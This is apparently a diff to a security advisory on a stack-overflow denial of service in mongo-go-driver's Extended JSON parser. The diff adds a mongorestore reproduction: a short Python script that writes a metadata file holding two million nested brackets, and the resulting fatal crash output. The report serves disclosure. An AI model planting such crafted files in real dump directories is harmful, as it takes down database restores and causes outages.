@@ -38,8 +38,16 @@ control that covers one syntactic case of the same construct but not its sibling
   Tools**), tag `100.18.0`, commit
   [`21a342dfee6468ad9350d156d25086da64dd03b1`](https://github.com/mongodb/mongo-tools/commit/21a342dfee6468ad9350d156d25086da64dd03b1),
   which vendors this exact driver version byte-for-byte (verified directly, diffed clean against
-  the driver's own repo at the pinned commit) and calls `bson.UnmarshalExtJSON` from
-  `mongoimport`'s JSON input path.
+  the driver's own repo at the pinned commit), via **two independent call sites**:
+  - `mongoimport --type=json`'s JSON input path
+    ([`mongoimport/json.go#L171`](https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongoimport/json.go#L171))
+  - `mongorestore`'s per-collection metadata parsing
+    ([`mongorestore/metadata.go#L57`](https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongorestore/metadata.go#L57)),
+    triggered by a single malicious `<collection>.metadata.json` file inside **any** dump
+    directory restored with `mongorestore --dir` — arguably the more dangerous of the two, since
+    it fires during the very first "reading metadata" step of the single most standard way
+    anyone restores a MongoDB backup, and needs no special flag (`--type=json` isn't required;
+    plain `mongorestore --dir <dump>` is enough).
 - This affects any Go application — not just `mongoimport` — that calls
   `bson.UnmarshalExtJSON`/`bson.UnmarshalExtJSONValue` (or anything that routes through the
   driver's Extended-JSON-to-`interface{}` decode path) on untrusted input.
@@ -147,6 +155,37 @@ Failed: invalid JSON input; nesting too deep (201 levels) at position 488
 0 document(s) imported successfully. 0 document(s) failed to import.
 ```
 
+**Second, independent reproduction — via `mongorestore` restoring an ordinary dump directory**
+(no `--type=json`, no special flags, just the single most standard restore invocation):
+
+```python
+# dump/test/deepnest.bson can be empty (0 bytes).
+# dump/test/deepnest.metadata.json: the malicious array must sit as a *value inside* the
+# "options" object, since Metadata.Options is typed bson.D and its outer value must itself
+# be an object -- the array goes one level deeper, at an arbitrary key within it.
+N = 2_000_000
+with open('dump/test/deepnest.metadata.json', 'wb') as f:
+    f.write(b'{"options":{"a":')
+    f.write(b'[' * N)
+    f.write(b'1')
+    f.write(b']' * N)
+    f.write(b'}}')
+```
+
+```
+$ mongorestore --port 27017 --dir dump
+2026-08-30T23:55:51.100+0000  preparing collections to restore from
+2026-08-30T23:55:51.100+0000  reading metadata for `test.deepnest` from `dump/test/deepnest.metadata.json`
+runtime: goroutine stack exceeds 1000000000-byte limit
+fatal error: stack overflow
+$ echo $?
+2
+```
+
+The crash fires during the very first "reading metadata" step, before `mongorestore` has
+inserted a single document — a single hostile file anywhere in an otherwise-ordinary-looking
+dump directory is sufficient to take down the whole restore the moment it's pointed at.
+
 ## Authentication Required
 
 **None.** The PoC was run against a target `mongod` with no `--auth` flag (the unauthenticated
@@ -159,10 +198,16 @@ attacker-supplied file — a file/supply-chain trust boundary, not an authentica
 
 ## Impact
 
-Any application built on `mongo-go-driver` that parses Extended JSON from an untrusted source —
-and, concretely, any operator who runs `mongoimport --type=json` against a file from an untrusted
-or attacker-influenced source — has their process crash unrecoverably from a single, cheap-to-
-produce, few-megabyte (plausibly much smaller) input file. Because this is a Go **fatal error**
+Any application built on `mongo-go-driver` that parses Extended JSON from an untrusted source has
+its process crash unrecoverably from a single, cheap-to-produce, few-megabyte (plausibly much
+smaller) input file. Concretely, within `mongo-tools` this is reachable two ways, one of which
+needs no special invocation at all: an operator running `mongoimport --type=json` against an
+untrusted file, **or** an operator running plain `mongorestore --dir <dump>` — the single most
+standard restore command there is — against a dump directory containing one hostile
+`.metadata.json` among otherwise-ordinary files. The latter is the more realistic threat: dump
+directories are routinely shared, migrated between environments, or sourced from backups whose
+full provenance isn't always verified, and the crash fires before a single document is restored.
+Because this is a Go **fatal error**
 (stack overflow), not a panic, no `recover()` anywhere in the calling application can catch or
 mitigate it — the process terminates immediately regardless of any error-handling the embedding
 application has in place. This is a clean, deterministic, unauthenticated denial-of-service
@@ -207,5 +252,7 @@ the codec layer.
   - https://github.com/mongodb/mongo-go-driver/blob/fd0737fcaa0a3ab763ffa4453354ac50420e3c04/bson/slice_codec.go#L160
   - https://github.com/mongodb/mongo-go-driver/blob/fd0737fcaa0a3ab763ffa4453354ac50420e3c04/bson/empty_interface_codec.go#L99
   - https://github.com/mongodb/mongo-go-driver/blob/fd0737fcaa0a3ab763ffa4453354ac50420e3c04/bson/default_value_decoders.go#L1418
-- Reachability entry point in `mongo-tools`: https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongoimport/json.go#L171
+- Reachability entry points in `mongo-tools`:
+  - `mongoimport`: https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongoimport/json.go#L171
+  - `mongorestore`: https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongorestore/metadata.go#L57
 - Vendored driver copy in `mongo-tools`, verified byte-identical to the driver repo at the pinned commit: `vendor/go.mongodb.org/mongo-driver/v2/bson/` (go.mod pins `go.mongodb.org/mongo-driver/v2 v2.7.0`)
